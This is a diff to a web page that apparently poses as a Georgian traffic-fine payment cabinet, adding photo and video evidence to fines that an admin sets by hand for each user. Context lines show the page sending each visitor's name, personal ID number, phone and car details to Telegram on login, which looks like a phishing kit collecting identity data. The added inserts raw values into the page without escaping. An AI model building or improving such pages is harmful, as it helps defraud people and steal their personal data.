@@ -103,6 +103,8 @@
         .dash-card { background: #132e23; border: 1px solid #1a3e30; border-radius: 16px; padding: 20px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
         .car-badge { background: #d9f96b; color: #0d231a; padding: 6px 12px; border-radius: 8px; font-weight: bold; font-size: 13px; }
 
+        .fine-media-preview { margin-top: 10px; max-width: 100%; max-height: 200px; border-radius: 8px; border: 1px solid #1a3e30; }
+
         .user-db-card { background: #132e23; border: 1px solid #1a3e30; border-radius: 14px; padding: 18px; margin-bottom: 14px; transition: 0.2s; }
         .user-db-card:hover { border-color: #d9f96b; }
         .user-db-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #17362a; padding-bottom: 10px; margin-bottom: 12px; flex-wrap: wrap; gap: 10px; }
@@ -1045,13 +1047,21 @@
                 return;
             }
 
-            const loginMessage = `👤 <b>مომხმარებელი შევიდა პირად კაბინეტში!</b>\n\n👤 <b>სახელი:</b> ${savedData.name}\n🆔 <b>პირადი:</b> ${pid}\n📞 <b>ტელეფონი:</b> ${phone}\n🚗 <b>მანქანა:</b> ${car}\n📦 <b>პაკეტი:</b> ${savedData.package}`;
+            const loginMessage = `👤 <b>მომხმარებელი შევიდა პირად კაბინეტში!</b>\n\n👤 <b>სახელი:</b> ${savedData.name}\n🆔 <b>პირადი:</b> ${pid}\n📞 <b>ტელეფონი:</b> ${phone}\n🚗 <b>მანქანა:</b> ${car}\n📦 <b>პაკეტი:</b> ${savedData.package}`;
             sendTelegramMessageUniversal(loginMessage);
 
             loadUserData(savedData);
             closeCabinetLogin();
             document.getElementById('cabinetDashboard').style.display = 'block';
             startLiveCountdown(savedData.timestamp, savedData.days);
+        }
+
+        function renderMediaHTML(mediaUrl, mediaType) {
+            if (!mediaUrl) return '';
+            if (mediaType && mediaType.startsWith('video/')) {
+                return `<div style="margin-top: 10px;"><video src="${mediaUrl}" controls class="fine-media-preview"></video></div>`;
+            }
+            return `<div style="margin-top: 10px;"><a href="${mediaUrl}" target="_blank"><img src="${mediaUrl}" class="fine-media-preview" alt="Fine image" /></a></div>`;
         }
 
         function loadUserData(data) {
@@ -1082,18 +1092,22 @@
                 } else {
                     finesArr.forEach(f => {
                         totalSum += parseFloat(f.sum) || 0;
+                        const mediaElement = renderMediaHTML(f.mediaUrl, f.mediaType);
                         finesHTML += `
-                        <div class="dash-card">
-                            <div style="display: flex; align-items: center; gap: 15px;">
-                                <span class="car-badge">${data.car}</span>
-                                <div>
-                                    <div style="font-weight: bold; margin-bottom: 4px;">${f.desc}</div>
-                                    <div style="font-size: 12px; color: #b0c2bc;">📅 ${f.date} | ${currentLang === 'ENG' ? 'Receipt:' : (currentLang === 'RUS' ? 'Квитанция:' : 'ქვითარი:')} #${f.receiptNo || '—'}</div>
+                        <div class="dash-card" style="flex-direction: column; align-items: stretch;">
+                            <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                                <div style="display: flex; align-items: center; gap: 15px;">
+                                    <span class="car-badge">${data.car}</span>
+                                    <div>
+                                        <div style="font-weight: bold; margin-bottom: 4px;">${f.desc}</div>
+                                        <div style="font-size: 12px; color: #b0c2bc;">📅 ${f.date} | ${currentLang === 'ENG' ? 'Receipt:' : (currentLang === 'RUS' ? 'Квитанция:' : 'ქვითარი:')} #${f.receiptNo || '—'}</div>
+                                    </div>
+                                </div>
+                                <div style="text-align: right;">
+                                    <div style="font-size: 18px; font-weight: bold; color: #f87171; margin-bottom: 5px;">${f.sum}</div>
                                 </div>
                             </div>
-                            <div style="text-align: right;">
-                                <div style="font-size: 18px; font-weight: bold; color: #f87171; margin-bottom: 5px;">${f.sum}</div>
-                            </div>
+                            ${mediaElement}
                         </div>`;
                     });
                 }
@@ -1253,7 +1267,7 @@
             finesContainer.innerHTML = '';
             if (userData.fines && userData.fines.length > 0) {
                 userData.fines.forEach(f => {
-                    addNewFineFields(f.sum, f.desc, f.date, f.receiptNo);
+                    addNewFineFields(f.sum, f.desc, f.date, f.receiptNo, f.mediaUrl, f.mediaType);
                 });
             } else if (!userData.noFine) {
                 addNewFineFields();
@@ -1273,12 +1287,20 @@
             }
         }
 
-        function addNewFineFields(sum='', desc='', date='', receiptNo='') {
+        function addNewFineFields(sum='', desc='', date='', receiptNo='', mediaUrl='', mediaType='') {
             const container = document.getElementById('finesListContainer');
             const index = container.children.length + 1;
             const div = document.createElement('div');
             div.className = 'fine-item-box';
             div.style.cssText = "background: #17362a; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #1a3e30; position: relative;";
+            
+            let previewArea = '';
+            if (mediaUrl) {
+                previewArea = mediaType && mediaType.startsWith('video/')
+                    ? `<video src="${mediaUrl}" controls style="max-width: 100%; max-height: 150px; margin-top: 10px; border-radius: 8px;"></video>`
+                    : `<img src="${mediaUrl}" style="max-width: 100%; max-height: 150px; margin-top: 10px; border-radius: 8px;" />`;
+            }
+
             div.innerHTML = `
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                     <span style="font-size: 12px; color: #d9f96b; font-weight: bold;">Fine #${index}</span>
@@ -1287,9 +1309,38 @@
                 <div class="form-group"><label>Fine Amount (e.g. 50 GEL)</label><input type="text" class="fine-sum" value="${sum}" placeholder="50 GEL" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30;" required></div>
                 <div class="form-group"><label>Fine Description</label><input type="text" class="fine-desc" value="${desc}" placeholder="Speeding" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30;" required></div>
                 <div class="form-group"><label>Fine Date</label><input type="text" class="fine-date" value="${date}" placeholder="02-06-2026, 6:18:45" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30;" required></div>
-                <div class="form-group" style="margin-bottom: 0;"><label>Receipt Number</label><input type="text" class="fine-receipt" value="${receiptNo}" placeholder="3ჯ1224700" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30;" required></div>
+                <div class="form-group"><label>Receipt Number</label><input type="text" class="fine-receipt" value="${receiptNo}" placeholder="3ჯ1224700" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30;" required></div>
+                <div class="form-group" style="margin-bottom: 0;">
+                    <label style="color: #d9f96b;">📸 ფოტოს/ვიდეოს ატვირთვა</label>
+                    <input type="file" class="fine-file-input" accept="image/*,video/*" style="background: #0d231a; color: #fff; border: 1px solid #1a3e30; padding: 8px;">
+                    <input type="hidden" class="fine-media-url" value="${mediaUrl}">
+                    <input type="hidden" class="fine-media-type" value="${mediaType}">
+                    <div class="media-preview-box">${previewArea}</div>
+                </div>
             `;
             container.appendChild(div);
+
+            const fileInput = div.querySelector('.fine-file-input');
+            const mediaUrlInput = div.querySelector('.fine-media-url');
+            const mediaTypeInput = div.querySelector('.fine-media-type');
+            const previewContainer = div.querySelector('.media-preview-box');
+
+            fileInput.addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = function(evt) {
+                        mediaUrlInput.value = evt.target.result;
+                        mediaTypeInput.value = file.type;
+                        if (file.type.startsWith('video/')) {
+                            previewContainer.innerHTML = `<video src="${evt.target.result}" controls style="max-width: 100%; max-height: 150px; margin-top: 10px; border-radius: 8px;"></video>`;
+                        } else {
+                            previewContainer.innerHTML = `<img src="${evt.target.result}" style="max-width: 100%; max-height: 150px; margin-top: 10px; border-radius: 8px;" />`;
+                        }
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
         }
 
         function saveAdminData(event) {
@@ -1315,7 +1366,9 @@
                         sum: box.querySelector('.fine-sum').value,
                         desc: box.querySelector('.fine-desc').value,
                         date: box.querySelector('.fine-date').value,
-                        receiptNo: box.querySelector('.fine-receipt').value
+                        receiptNo: box.querySelector('.fine-receipt').value,
+                        mediaUrl: box.querySelector('.fine-media-url').value || '',
+                        mediaType: box.querySelector('.fine-media-type').value || ''
                     });
                 });
             }
@@ -1490,18 +1543,22 @@
             } else {
                 u.fines.forEach(f => {
                     totalSum += parseFloat(f.sum) || 0;
+                    const mediaElement = renderMediaHTML(f.mediaUrl, f.mediaType);
                     finesHtml += `
-                    <div class="dash-card" style="background: #17362a; border: 1px solid #1a3e30;">
-                        <div style="display: flex; align-items: center; gap: 12px;">
-                            <span class="car-badge">${u.car}</span>
-                            <div>
-                                <div style="font-weight: bold; margin-bottom: 4px; font-size: 14px;">${f.desc}</div>
-                                <div style="font-size: 12px; color: #b0c2bc;">📅 ${f.date} | Receipt: #${f.receiptNo || '—'}</div>
+                    <div class="dash-card" style="background: #17362a; border: 1px solid #1a3e30; flex-direction: column; align-items: stretch;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                            <div style="display: flex; align-items: center; gap: 12px;">
+                                <span class="car-badge">${u.car}</span>
+                                <div>
+                                    <div style="font-weight: bold; margin-bottom: 4px; font-size: 14px;">${f.desc}</div>
+                                    <div style="font-size: 12px; color: #b0c2bc;">📅 ${f.date} | Receipt: #${f.receiptNo || '—'}</div>
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-size: 16px; font-weight: bold; color: #f87171;">${f.sum}</div>
                             </div>
                         </div>
-                        <div style="text-align: right;">
-                            <div style="font-size: 16px; font-weight: bold; color: #f87171;">${f.sum}</div>
-                        </div>
+                        ${mediaElement}
                     </div>`;
                 });
             }
@@ -1655,3 +1712,5 @@
     </script>
 </body>
 </html>
+
+
